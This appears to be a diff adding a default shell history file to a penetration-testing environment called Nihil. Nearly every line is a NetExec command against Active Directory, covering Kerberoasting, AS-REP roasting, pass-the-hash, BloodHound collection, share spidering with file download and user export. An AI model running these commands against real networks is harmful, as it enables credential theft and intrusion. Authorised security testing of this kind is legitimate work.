@@ -1,0 +1,21 @@
+# Default history for Nihil
+ls -la
+nxc --help
+netexec --version
+ip a
+whoami
+nxc mssql "$IP" -u "$USER" -p "$PASSWORD" -M enum_impersonate 
+nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --bloodhound -c all --dns-server "$IP"
+nxc ldap "$IP" -u "$USER" -p "$PASSWORD" -M tombstone -o ACTION=query -k
+nxc ldap "$IP" -u "$USER" -p "$PASSWORD" -M tombstone -k -o ACTION=restore ID=1c6b1deb-c372-4cbb-87b1-15031de169db
+nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --asreproast ASREProstables.txt
+nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --kerberoast Kerberoastables.txt
+nxc ldap "$IP" -u "$USER" -H "$NT_HASH" -k --dns-server $IP
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --generate-krb5 /etc/krb5.conf
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --generate-hosts /etc/hosts
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" -k --generate-tgt "$USER"
+nxc smb "$IP" -u "$USER" -p "$PASSWORD"
+nxc smb "$IP" -u "$USER" -p "$PASSWORD"  -M spider_plus -o DOWNLOAD_FLAG=true
+nxc smb "$IP" -u "$USER" -p "$PASSWORD"  -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER "$USER"_spider_plus
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" --users-export users.txt
+
